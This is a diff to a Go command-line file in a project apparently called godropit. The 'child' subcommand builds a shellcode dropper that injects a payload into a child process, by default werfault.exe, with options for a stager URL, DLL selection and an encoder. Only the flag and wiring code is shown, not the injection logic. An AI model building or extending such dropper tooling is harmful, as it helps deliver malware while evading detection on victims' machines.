@@ -1,9 +1,9 @@
 package cmd
 
 import (
+	"godropit/internal/godroplib/child"
+	"godropit/pkg/gengo"
 	"log"
-
-	"godropit/internal/gengo"
 
 	"github.com/spf13/cobra"
 )
@@ -17,28 +17,43 @@ var childCmd = &cobra.Command{
 	Short: "Execute in a child process",
 	Long:  `Executes in a child process which has been started by the same application.`,
 	Run: func(cmd *cobra.Command, args []string) {
+		checkImg()
 		if input == "" {
 			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
 		}
-		gengo.NewChildDropper(input, output, domain, name, proc, procArgs, time, false, shared, arch)
+
+		name = check(name)
+		var childDrop gengo.Dropper
+		var Dtype gengo.DtypeChild
+		var err error
+
+		Dtype.Args = procArgs
+		Dtype.ChildProc = proc
+		childDrop.Delay = time
+		childDrop.Arch = arch
+		childDrop.Shared = shared
+		childDrop.Debug = debug
+
+		childDrop.Dtype, err = gengo.GenDTypeChild(Dtype)
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		childDrop.Dlls, childDrop.Inject, childDrop.Import = child.SelectChild()
+
+		gengo.NewDropper(childDrop, name, domain, input, output, stagerurl, imgpath, hostname, ua, sgn)
+
 	},
 }
 
 func init() {
 	newCmd.AddCommand(childCmd)
 
-	// Here you will define your flags and configuration settings.
-
 	childCmd.MarkFlagRequired("in")
 	childCmd.MarkFlagRequired("name")
 	childCmd.MarkFlagRequired("out")
 
-	// Cobra supports Persistent Flags which will work for this command
-	// and all subcommands, e.g.:
-	// localCmd.PersistentFlags().String("foo", "", "A help for foo")
-
-	// Cobra supports local flags which will only run when this command
-	// is called directly, e.g.:
+	//child specific flags
 	childCmd.Flags().StringVarP(&proc, "proc", "p", "c:\\\\windows\\\\system32\\\\werfault.exe", "Child Process to execute in.")
-	childCmd.Flags().StringVar(&procArgs, "args", "args", "Arguments to pass child proc, embed in quotes or escape spaces pls.")
+	childCmd.Flags().StringVar(&procArgs, "args", "", "Arguments to pass child proc, embed in quotes or escape spaces pls.")
 }
